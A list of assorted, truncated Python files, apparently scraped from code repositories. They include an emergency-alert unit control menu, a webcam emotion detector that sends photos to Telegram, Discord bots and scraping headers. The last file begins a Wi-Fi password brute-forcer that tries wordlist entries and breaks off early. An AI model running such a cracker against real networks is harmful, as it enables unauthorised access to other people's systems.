    "name = \"French\"\n\nsystem_instruction = \"\"\"\nYou are an expert at analyzing and summarizing academic papers.\nPlease use $TeX$ to write mathematical equations.\nPlease only return the results, and do not include any comments.\nUse a formal academic writing style in French.\n\"\"\".strip()\n\nprompts = [\n    (\"# Abstract\", \"Traduisez l'Abstract au d\u00e9but du document en fran\u00e7ais.\"),\n    (\"# R\u00e9sum\u00e9\", \"R\u00e9sumez le document en une seule phrase en fran\u00e7ais.\"),\n    (\"## \u00c9nonc\u00e9 du Probl\u00e8me\", \"Quel probl\u00e8me le document cherche-t-il \u00e0 r\u00e9soudre ? R\u00e9pondez en fran\u00e7ais.\"),\n    (\"## M\u00e9thodologie\", \"Quelle m\u00e9thodologie le document propose-t-il ? R\u00e9pondez en fran\u00e7ais.\"),\n    (\"## Nouveaut\u00e9\", \"Quelle est la nouveaut\u00e9 du document ? R\u00e9pondez en fran\u00e7ais.\"),\n    (\"# Structure du Document\", \"\"\"G\u00e9n\u00e9rez la structure du document sous forme de tableau JSON sans traduction. Exemple :\n```json\n[\n  \"1 Introduction\",\n  \"1.1 Background\",\n  \"2 Methods\",\n  \"2.1 Data\",\n  \"2.1.1 Dataset\"\n]\n```\"\"\"),\n]\n\nsprompt = (\"R\u00e9sumez la section '%s' en fran\u00e7ais.\", \"', '\")\n",
    "import os, serial, time\nfrom json import load, loads\n\ndef coolPrint(content, line=True):\n    if line:\n        content = content+'\\n======================================================\\n'\n    for char in content:\n        print(char, end='')\n        time.sleep(.01)\n\ndef clsc():\n    os.system('cls' if os.name == 'nt' else 'clear')\n\nclsc()\n\nprint(\"\"\"\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\n\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u255a\u2550\u255d\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u255a\u2550\u255d\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\n\"\"\")\ncoolPrint(\"======================================================\\n\",False)\ncoolPrint(\"Developed by dondaplayer. Thanks to MoSiren for research/testing.\\n\",False)\ncoolPrint(\"Version 1.0.0 - Release Build\\n\",False)\ncoolPrint(\"Please wait, loading config...\\n\",False)\ncoolPrint(\"======================================================\\n\",False)\n\nwith open('config.json', 'r') as f:\n    conf = load(f)\n\nwith open('TFTData.json', 'r') as f:\n    tftdata = load(f)\nport = conf['serial']\nbaud = conf['baud']\npin = conf['password']\n\nser = serial.Serial(port=port, baudrate = baud, bytesize=8, stopbits=1)\n\ntime.sleep(3)\nclsc()\n\ndef main():\n    while True:\n        coolPrint(\"\"\"\nAvailable Commands:\n    1 - Record Voice Message\n    2 - Play Voice Message\n    3 - Live Patch\n    4 - Record Announcement\n    5 - Play Announcement\n    6 - Weekly Test\n    7 - Originate Alert\n    8 - Send EOM\n    9 - Reboot Unit\n    0 - Help\n    Q - Exit\n        \"\"\")\n        selection = input('\\nSelection: ')\n        \n        if selection == '1':\n            clsc()\n            coolPrint('''\n    Voice Record:\n        Records a voice message through Monitor 1.\n        Usage: Y/N\n    ''')\n            yno = input('Record voice? ')\n            if yno.lower() == 'y':\n                ser.write(f'*{pin}09#'.encode('utf-8'))\n                coolPrint('Recording voice! Press enter when finished.')\n                input()\n                ser.write('#'.encode('utf-8'))\n                clsc(); continue\n            else:\n                clsc(); continue\n\n        elif selection == '2':\n            clsc()\n            coolPrint('''\n    Voice Playback:\n        Plays back recorded voice message\n        Usage: Y/N\n    ''')\n            yno = input('Play? ')\n            if yno.lower() == 'y':\n                ser.write(f'*{pin}11#'.encode('utf-8'))\n                coolPrint('Press enter when finished.')\n                input()\n                ser.write('#'.encode('utf-8'))\n                clsc(); continue\n            else:\n                clsc(); continue\n\n        elif selection == '3':\n            clsc()\n            coolPrint('''\n    Live Patch:\n        Patches live audio through main audio output and triggers\n        on-air relay.\n        Usage: Y/N\n    ''')\n            yno = input('Patch live audio? ')\n            if yno.lower() == 'y':\n                ser.write(f'*{pin}20#'.encode('utf-8'))\n                coolPrint('Patching live audio. Press enter when finished.')\n                input()\n                ser.write('#'.encode('utf-8'))\n                clsc(); continue\n            else:\n                clsc(); continue\n\n        elif selection == '4':\n            clsc()\n            coolPrint('''\n    Announcement Record:\n        Records an announcement through Monitor 1.\n        Usage: Y/N\n    ''')\n            yno = input('Record? ')\n            if yno.lower() == 'y':\n                ser.write(f'*{pin}21#'.encode('utf-8'))\n                coolPrint('Recording announcement! Press enter when finished.')\n                input()\n                ser.write('#'.encode('utf-8'))\n                clsc(); continue\n            else:\n                clsc(); continue\n\n        elif selection == '5':\n            clsc()\n            coolPrint('''\n    Announcement Playback:\n        Plays back announcement.\n        Usage: Y/N\n    ''')\n            yno = input('Play? ')\n            if yno.lower() == 'y':\n                ser.write(f'*{pin}22#'.encode('utf-8'))\n                coolPrint('Playing! Press enter when finished.')\n                input()\n                ser.write('#'.encode('utf-8'))\n                clsc(); continue\n            else:\n                clsc(); continue\n\n        elif selection == '6':\n            clsc()\n            coolPrint('''\n    Weekly Test:\n        Sends a weekly test..\n        Usage: Y/N\n    ''')\n            yno = input('Send weekly? ')\n            if yno.lower() == 'y':\n                tone = input('Attention tone? (Y/N) ')\n                if tone.lower() == 'y':\n                    ser.write(f'*{pin}31#'.encode('utf-8'))\n                    coolPrint('Sending RWT with Attention Tone. Press enter to return to menu.')\n                    input()\n                    clsc(); continue\n                elif tone.lower() == 'n':\n                    ser.write(f'*{pin}30#'.encode('utf-8'))\n                 ",
    "# setup_database.py\nimport sqlite3\n\n# Connect to the SQLite database (or create it if it doesn't exist)\nconn = sqlite3.connect(\"chatbot.db\")\ncursor = conn.cursor()\n\n# Create the math_operations table\ncursor.execute(\"\"\"\nCREATE TABLE IF NOT EXISTS math_operations (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    operation TEXT NOT NULL,\n    result TEXT NOT NULL\n)\n\"\"\")\n\n# Commit the changes and close the connection\nconn.commit()\nconn.close()\n\nprint(\"Database and tables created successfully!\")\n\n# Test for setup_database.py\nif __name__ == \"__main__\":\n    print(\"Testing setup_database.py...\")\n    # Re-run the script to ensure it doesn't fail if the table already exists\n    print(\"Attempting to create the database and table again...\")\n    conn = sqlite3.connect(\"chatbot.db\")\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT name FROM sqlite_master WHERE type='table' AND name='math_operations'\")\n    table_exists = cursor.fetchone()\n    if table_exists:\n        print(\"Table 'math_operations' already exists. No issues detected.\")\n    else:\n        print(\"Table 'math_operations' was not created. Check the script for errors.\")\n    conn.close()",
    "import cv2\nfrom deepface import DeepFace\nimport telebot\nimport threading\nimport json\nimport os\nimport time\nfrom PyQt5 import QtWidgets, QtGui\n\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\ndef setup():\n    token = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 Telegram Token: \").strip()\n    chat_id = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 Telegram Chat ID: \").strip()\n    config = {\"TOKEN\": token, \"CHAT_ID\": chat_id, \"INTERVAL\": 15}  # \u0418\u043d\u0442\u0435\u0440\u0432\u0430\u043b \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n    with open('config.json', 'w') as f:\n        json.dump(config, f)\n    print(\"\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430!\")\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\ndef load_config():\n    if not os.path.exists('config.json'):\n        setup()\n    with open('config.json', 'r') as f:\n        return json.load(f)\n\nconfig = load_config()\nTOKEN = config['TOKEN']\nCHAT_ID = config['CHAT_ID']\nINTERVAL = config.get('INTERVAL', 15)\n\nbot = telebot.TeleBot(TOKEN)\ndetection_active = False\n\ndef detect_emotions():\n    global detection_active\n    detection_active = True\n    cap = cv2.VideoCapture(1)\n    if not cap.isOpened():\n        bot.send_message(CHAT_ID, \"\u274c \u041e\u0448\u0438\u0431\u043a\u0430 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u043a\u0430\u043c\u0435\u0440\u0435\")\n        detection_active = False\n        return\n    prev_emotion = None\n    while detection_active:\n        time.sleep(INTERVAL)\n        ret, frame = cap.read()\n        if not ret:\n            bot.send_message(CHAT_ID, \"\u274c \u041e\u0448\u0438\u0431\u043a\u0430 \u0437\u0430\u0445\u0432\u0430\u0442\u0430 \u043a\u0430\u0434\u0440\u0430\")\n            break\n        try:\n            analysis = DeepFace.analyze(frame, actions=['emotion'], enforce_detection=False)\n            emotion = analysis[0]['dominant_emotion']\n            emotion_probability = analysis[0]['emotion'][emotion]\n            if emotion != prev_emotion:\n                photo_path = \"detected_emotion.jpg\"\n                cv2.imwrite(photo_path, frame)\n                bot.send_message(CHAT_ID, f\"\ud83d\udc64 \u042d\u043c\u043e\u0446\u0438\u044f: {emotion} ({emotion_probability:.2f}%)\")\n                with open(photo_path, 'rb') as photo:\n                    bot.send_photo(CHAT_ID, photo)\n                prev_emotion = emotion\n        except Exception as e:\n            bot.send_message(CHAT_ID, f\"\u274c \u041e\u0448\u0438\u0431\u043a\u0430 \u0430\u043d\u0430\u043b\u0438\u0437\u0430: {e}\")\n    cap.release()\n    detection_active = False\n\nclass EmotionBotUI(QtWidgets.QWidget):\n    def __init__(self):\n        super().__init__()\n        self.initUI()\n\n    def initUI(self):\n        self.setWindowTitle('Emotion Detection Bot')\n        self.setGeometry(100, 100, 400, 300)\n        layout = QtWidgets.QVBoxLayout()\n\n        self.token_input = QtWidgets.QLineEdit(self)\n        self.token_input.setPlaceholderText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 Telegram Token\")\n        self.token_input.setText(TOKEN)\n        layout.addWidget(self.token_input)\n\n        self.chat_id_input = QtWidgets.QLineEdit(self)\n        self.chat_id_input.setPlaceholderText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 Telegram Chat ID\")\n        self.chat_id_input.setText(CHAT_ID)\n        layout.addWidget(self.chat_id_input)\n\n        self.interval_input = QtWidgets.QSpinBox(self)\n        self.interval_input.setRange(5, 60)\n        self.interval_input.setValue(INTERVAL)\n        self.interval_input.setSuffix(\" \u0441\u0435\u043a\")\n        layout.addWidget(self.interval_input)\n\n        self.start_btn = QtWidgets.QPushButton(\"\u0421\u0442\u0430\u0440\u0442\", self)\n        self.start_btn.clicked.connect(self.start_analysis)\n        layout.addWidget(self.start_btn)\n\n        self.stop_btn = QtWidgets.QPushButton(\"\u0421\u0442\u043e\u043f\", self)\n        self.stop_btn.clicked.connect(self.stop_analysis)\n        layout.addWidget(self.stop_btn)\n\n        self.setLayout(layout)\n\n    def start_analysis(self):\n        global TOKEN, CHAT_ID, INTERVAL, detection_active\n        TOKEN = self.token_input.text()\n        CHAT_ID = self.chat_id_input.text()\n        INTERVAL = self.interval_input.value()\n        config.update({\"TOKEN\": TOKEN, \"CHAT_ID\": CHAT_ID, \"INTERVAL\": INTERVAL})\n        with open('config.json', 'w') as f:\n            json.dump(config, f)\n        if not detection_active:\n            threading.Thread(target=detect_emotions).start()\n\n    def stop_analysis(self):\n        global detection_active\n        detection_active = False\n\nif __name__ == \"__main__\":\n    app = QtWidgets.QApplication([])\n    window = EmotionBotUI()\n    window.show()\n    app.exec_()\n",
    "from fpdf import FPDF\r\n\r\n# Collect input\r\nname, email, phone, linkedin = input(\"Name, Email, Phone, LinkedIn: \").split(\", \")\r\neducation, university, grad_year = input(\"Education, University, Graduation Year: \").split(\", \")\r\nwork_experience = input(\"Work Experience: \")\r\nskills = input(\"Skills (comma separated): \")\r\n\r\n# Generate PDF\r\npdf = FPDF()\r\npdf.add_page()\r\npdf.set_font('Arial', 'B', 16)\r\npdf.cell(200, 10, txt=\"Curriculum Vitae\", ln=True, align='C')\r\npdf.ln(10)\r\n\r\npdf.set_font('Arial', 'B', 12)\r\npdf.cell(200, 10, txt=\"Personal Information\", ln=True)\r\npdf.set_font('Arial', '', 12)\r\npdf.multi_cell(0, 10, f\"Name: {name}\\nEmail: {email}\\nPhone: {phone}\\nLinkedIn: {linkedin}\")\r\npdf.ln(10)\r\n\r\npdf.set_font('Arial', 'B', 12)\r\npdf.cell(200, 10, txt=\"Education\", ln=True)\r\npdf.set_font('Arial', '', 12)\r\npdf.multi_cell(0, 10, f\"{education}\\n{university}, {grad_year}\")\r\npdf.ln(10)\r\n\r\npdf.set_font('Arial', 'B', 12)\r\npdf.cell(200, 10, txt=\"Work Experience\", ln=True)\r\npdf.set_font('Arial', '', 12)\r\npdf.multi_cell(0, 10, work_experience)\r\npdf.ln(10)\r\n\r\npdf.set_font('Arial', 'B', 12)\r\npdf.cell(200, 10, txt=\"Skills\", ln=True)\r\npdf.set_font('Arial', '', 12)\r\npdf.multi_cell(0, 10, skills)\r\n\r\n# Output PDF\r\npdf.output('cv_short.pdf')\r\n\r\nprint(\"CV created!\")\r\n",
    "#Python 3.8 or higher is required.\n#py -3 -m pip install -U disnake\n#pip3 install python-a2s\n#pip install aiofiles\n\nimport disnake\nfrom disnake.ext import commands, tasks\nfrom disnake import Intents\nimport json\nimport datetime\nimport a2s\nimport requests\nimport configparser\nimport re\nimport unicodedata\nfrom requests.auth import HTTPBasicAuth\nfrom concurrent.futures import ThreadPoolExecutor\n\nimport aiohttp\nimport asyncio\nimport time\nimport os\nimport glob\nimport subprocess\nimport random\nimport base64\nimport aiofiles\n\n#Buffer Limits\nfrom collections import deque\nMAX_MESSAGES = 14\nTIME_WINDOW = 60\nBUFFER_LIMIT = MAX_MESSAGES // 2  # \u041f\u043e\u043b\u043e\u0432\u0438\u043d\u0430 \u043b\u0438\u043c\u0438\u0442\u0430\nmessage_buffer = deque()\nsend_interval = 0\nshard_count = 3\n\n#cant used\nprefix = '/'\n\n#Nothing change more\n\ndef read_cfg():\n    config = configparser.ConfigParser(interpolation=None)\n    try:\n        with open('config.ini', 'r', encoding='utf-8') as file:\n            config.read_file(file)\n    except FileNotFoundError:\n        print(\"Error: Config.ini not found.\")\n        return None\n    return config\nasync def write_cfg(section, key, value):\n    config = read_cfg()\n    if f'{section}' not in config:\n        config[f'{section}'] = {}\n    config[f'{section}'][f'{key}'] = str(f'{value}')\n\n    with open('config.ini', 'w', encoding='utf-8') as configfile:\n        config.write(configfile)\ndef update_settings():\n    global token, channel_id, crosschat_id, message_id, update_time, bot_name, bot_ava, address, command_prefex, username, password, log_directory, cheat_log_directory, webhook_url, annonce_time, ch_list, cmd_list, cheaters, hide_personal_data, death_send\n\n    config = read_cfg()\n    if config:\n        try:\n            token = config['botconfig'].get('token', None)\n            channel_id = config['botconfig'].get('channel_id', None)\n            crosschat_id = config['botconfig'].get('crosschat_id', None)\n            message_id = config['botconfig'].get('message_id', None)\n            bot_name = config['botconfig'].get('bot_name', None)\n            bot_ava = config['botconfig'].get('bot_ava', None)\n            username = config['botconfig'].get('username', None)\n            password = config['botconfig'].get('password', None)\n            update_time = config['botconfig'].get('update_time', None)\n            annonce_time = config['botconfig'].get('annonce_time', None)\n            command_prefex = config['botconfig'].get('command_prefex', None) and config['botconfig'].get('command_prefex').lower()\n            address = (config['botconfig'].get('ip', None), int(config['botconfig'].get('query_port', 0)), int(config['botconfig'].get('restapi_port', 0)))\n            log_directory = config['botconfig'].get('log_dir', None)\n            cheat_log_directory = os.path.join(log_directory, \"Cheats/\")\n            webhook_url = config['botconfig'].get('webhook_url', None)\n            ch_list = config['botconfig'].get('ch_list', 'Global, Local, Guild').split(', ')\n            cmd_list = config['botconfig'].get('cmd_list', '/, /TeleportToMe').split(', ')\n            cheaters = config['botconfig'].getboolean('cheaters', True)\n            hide_personal_data = config['botconfig'].getboolean('hide_personal_data', True)\n            death_send = config['botconfig'].getboolean('death_send', True)\n\n        except ValueError as e:\n            print(f\"Error: wrong value in config file {e}\")\n        except Exception as e:\n            print(f\"Error: {e}\")\n\ntoken = None\nchannel_id = None\ncrosschat_id = None\nmessage_id = None\nbot_name = None\nbot_ava = None\nusername = None\npassword = None\nupdate_time = 10\nannonce_time = 600\naddress = None\ncommand_prefex = None\nwebhook_url = None\nlog_directory = None\ncheat_log_directory = None\ncurrent_file = None\nfile_position = 0\ncurrent_index = 0\ncheat_current_file = None\ncheat_file_position = 0\nuseonce = None\nch_list = []\ncmd_list = []\ncheaters = True\nhide_personal_data = True\ndeath_send = True\nupdate_settings()\n\nannonce_file = 'annonces.txt'\nif not os.path.exists(annonce_file):\n    with open(annonce_file, 'w', encoding='utf-8') as f:\n        f.write('')\n\n#bot idents\nintents = disnake.Intents.default()\nintents.messages = True\nintents = disnake.Intents().all()\nclient = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)\n#bot = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)\nbot = commands.AutoShardedBot(command_prefix=prefix, intents=intents, shard_count=shard_count ,case_insensitive=True)\n\ndef find_latest_file(log_directory):\n    list_of_files = glob.glob(f'{log_directory}*')\n    # \u0424\u0438\u043b\u044c\u0442\u0440\u0443\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a, \u0438\u0441\u043a\u043b\u044e\u0447\u0430\u044f \u0444\u0430\u0439\u043b\u044b, \u0438\u043c\u0435\u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 '-cheats'\n    filtered_files = [file for file in list_of_files if '-cheats' not in os.path.basename(file)]\n    if not filtered_files:\n        return None\n    latest_file = max(filtered_files, key=os.path.getctime)\n    return latest_file\n\nasync def watch_log_file(log_directory):\n    global current_file, file_position\n    old_line = \"\"\n    while True:\n        new_file = find_lates",
    "import argparse\nfrom pathlib import Path\nfrom utils.yaml_loader import load_yaml_files\nfrom manager import GeneratorManager\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Multi-language Code Generator\")\n    parser.add_argument(\"--yaml-dir\", required=True, help=\"Path to the directory containing YAML files.\")\n    parser.add_argument(\"--output-dir\", required=True, help=\"Path to the output directory.\")\n    parser.add_argument(\"--languages\", default=None, help=\"Comma-separated list of target languages (e.g., 'python,c'). Default: all.\")\n    args = parser.parse_args()\n\n    yaml_dir = Path(args.yaml_dir)\n    output_dir = Path(args.output_dir)\n    if not yaml_dir.is_dir():\n        print(f\"Error: YAML directory '{yaml_dir}' does not exist.\")\n        return\n    output_dir.mkdir(parents=True, exist_ok=True)\n\n    translations = load_yaml_files(yaml_dir)\n\n    manager = GeneratorManager()\n    target_languages = args.languages.split(\",\") if args.languages else manager.get_supported_languages()\n\n    for language in target_languages:\n        lang_output_dir = output_dir / language\n        lang_output_dir.mkdir(parents=True, exist_ok=True)\n        manager.generate(language, translations, lang_output_dir)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "kl_upload_file_headers = {\r\n    'content-type': 'application/octet-stream',\r\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\r\n    'accept': 'application/json, text/plain, */*',\r\n    'accept-encoding': 'gzip, deflate, br, zstd',\r\n}\r\n\r\ndownload_avatar_headers = {\r\n    'Content-Type': 'application/json',\r\n    'Accept': 'application/json',\r\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'\r\n}\r\n\r\nkl_main_headers = {\r\n    'connection': 'keep-alive',\r\n    'accept': 'application/json, text/plain, */*',\r\n    'accept-encoding': 'gzip, deflate, br, zstd',\r\n    'host': 'klingai.kuaishou.com',\r\n    'origin': 'https://klingai.kuaishou.com',\r\n    'sec-ch-ua': '\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\r\n    'sec-ch-ua-mobile': '?0',\r\n    'sec-fetch-dest': 'empty',\r\n    'sec-fetch-mode': 'cors',\r\n    'sec-fetch-site': 'same-origin',\r\n    'x-kslogid': '736107253663665697',\r\n    'referer': 'https://klingai.kuaishou.com/image-to-video/63575908',\r\n    'content-type': 'application/json;charset=UTF-8',\r\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\r\n}\r\n\r\nviggle_upload_file_headers = {\r\n    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryi2EVb79ueFSd1lJY',\r\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\r\n    'accept': 'application/json, text/plain, */*',\r\n    'accept-encoding': 'gzip, deflate, br, zstd',\r\n}\r\n\r\nviggle_main_headers = {\r\n    'accept': 'application/json, text/plain, */*',\r\n    'accept-encoding': 'gzip, deflate, br, zstd',\r\n    'origin': 'https://www.viggle.ai',\r\n    'sec-ch-ua': '\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\r\n    'sec-ch-ua-mobile': '?0',\r\n    'sec-fetch-dest': 'empty',\r\n    'sec-fetch-mode': 'cors',\r\n    'sec-fetch-site': 'same-origin',\r\n    'referer': 'https://www.viggle.ai/create-mix',\r\n    'content-type': 'application/json',\r\n    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',\r\n}\r\n\r\ndownload_viggle_headers = {\r\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\",\r\n    \"Accept-Encoding\": \"gzip, deflate, br, zstd\",\r\n    \"Accept-Language\": \"zh-CN,zh;q=0.9\",\r\n    \"Priority\": \"u=0, i\",\r\n    \"Sec-CH-UA\": '\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"',\r\n    \"Sec-CH-UA-Mobile\": \"?0\",\r\n    \"Sec-CH-UA-Platform\": '\"Windows\"',\r\n    \"Sec-Fetch-Dest\": \"document\",\r\n    \"Sec-Fetch-Mode\": \"navigate\",\r\n    \"Sec-Fetch-Site\": \"none\",\r\n    \"Sec-Fetch-User\": \"?1\",\r\n    \"Upgrade-Insecure-Requests\": \"1\",\r\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\r\n}",
    "from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig\nfrom peft import PeftModel\nimport discord\nfrom discord.ext import commands\nimport torch\nimport os\nimport logging\nfrom dotenv import load_dotenv\n\n# Configure logging\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\n# Load the .env file from the parent directory\nload_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '..', '.env'))\n\nclass SimpleBot(commands.Bot):\n    def __init__(self):\n        intents = discord.Intents.default()\n        intents.message_content = True\n        super().__init__(command_prefix='!', intents=intents)\n\n        # Configure device\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        logger.info(f\"Using device: {self.device}\")\n\n        # Load model and tokenizer with 4-bit quantization\n        try:\n            bnb_config = BitsAndBytesConfig(\n                load_in_4bit=True,\n                bnb_4bit_compute_dtype=torch.float16  # Match input type for performance\n            )\n\n            logger.info(\"Loading base model and tokenizer...\")\n            base_model_path = \"../models/base_model\"  # Replace with your base model path\n            adapter_path = \"../models/fine_tuned/final\"  # Replace with your adapter path\n\n            base_model = AutoModelForCausalLM.from_pretrained(\n                base_model_path,\n                quantization_config=bnb_config,\n                device_map=\"auto\",\n                offload_folder=\"offload\"\n            )\n            self.tokenizer = AutoTokenizer.from_pretrained(base_model_path)\n\n            # Set padding token to eos_token if not already set\n            if self.tokenizer.pad_token is None:\n                self.tokenizer.pad_token = self.tokenizer.eos_token\n\n            logger.info(\"Loading the LoRA adapter...\")\n            self.model = PeftModel.from_pretrained(base_model, adapter_path)\n            logger.info(\"Model and LoRA adapter loaded successfully!\")\n        except Exception as e:\n            logger.error(f\"Failed to load the model: {e}\")\n            raise\n\n    async def setup_hook(self):\n        await self.add_cog(SimpleCog(self))\n\n\nclass SimpleCog(commands.Cog):\n    def __init__(self, bot):\n        self.bot = bot\n\n    @commands.command()\n    async def ask(self, ctx, *, question: str):\n        \"\"\"Ask a question to the model\"\"\"\n        if not question.strip():\n            await ctx.send(\"Please provide a valid question.\")\n            return\n\n        async with ctx.typing():\n            try:\n                # Tokenize the user's input with attention mask\n                inputs = self.bot.tokenizer(\n                    question,\n                    return_tensors=\"pt\",\n                    padding=True,\n                    truncation=True\n                ).to(self.bot.device)\n\n                input_ids = inputs[\"input_ids\"]\n                attention_mask = inputs[\"attention_mask\"]\n\n                # Generate the response\n                with torch.no_grad():\n                    outputs = self.bot.model.generate(\n                        input_ids=input_ids,\n                        attention_mask=attention_mask,  # Explicitly pass the attention mask\n                        max_length=300,  # Adjust as needed\n                        temperature=0.7,\n                        top_p=0.9,\n                        no_repeat_ngram_size=3,\n                        pad_token_id=self.bot.tokenizer.eos_token_id\n                    )\n\n                # Decode the model's response\n                response = self.bot.tokenizer.decode(outputs[0], skip_special_tokens=True)\n\n                # Send response in chunks if it's too long\n                if len(response) > 2000:\n                    chunks = [response[i:i+1990] for i in range(0, len(response), 1990)]\n                    for chunk in chunks:\n                        await ctx.send(chunk)\n                else:\n                    await ctx.send(response)\n\n            except Exception as e:\n                logger.error(f\"Error during model inference: {e}\")\n                await ctx.send(\"Sorry, something went wrong while processing your request.\")\n\n    @commands.Cog.listener()\n    async def on_ready(self):\n        logger.info(f'Bot is ready and logged in as {self.bot.user}!')\n\n\ndef main():\n    # Create and run the bot\n    bot_token = os.getenv('DISCORD_TOKEN')  # Load token from .env file\n    if not bot_token:\n        raise ValueError(\"Discord token not found in environment variables!\")\n\n    bot = SimpleBot()\n    try:\n        bot.run(bot_token)\n    except Exception as e:\n        logger.error(f\"Failed to run the bot: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()",
    "import pywifi  # Import the pywifi module for Wi-Fi operations\r\nfrom pywifi import const  # Import constants from pywifi (example, for connection status)\r\nimport time  # Import time module to manage delays\r\n\r\n# Function to load passwords from a file\r\ndef load_passwords(file_path):\r\n    try:\r\n        with open(file_path, 'r') as file:\r\n            # Read lines from the file, strip whitespace, and return as a list\r\n            return [line.strip() for line in file if line.strip()]\r\n    except FileNotFoundError:\r\n        print(f\"\\n:( File '{file_path}' not found. Make sure the file exists and try again.\")\r\n        exit()\r\n\r\n# Function to connect to Wi-Fi with a given profile\r\ndef connect_to_wifi(iface, profile):\r\n    iface.remove_all_network_profiles()  # Remove all existing profiles\r\n    tmp_profile = iface.add_network_profile(profile)  # Add the new profile\r\n    iface.connect(tmp_profile)  # Attempt to connect\r\n    time.sleep(5)  # Wait for the connection to establish\r\n    return iface.status() == const.IFACE_CONNECTED  # Check connection status\r\n\r\ntry:\r\n    # Set up the Wi-Fi interface\r\n    wifi = 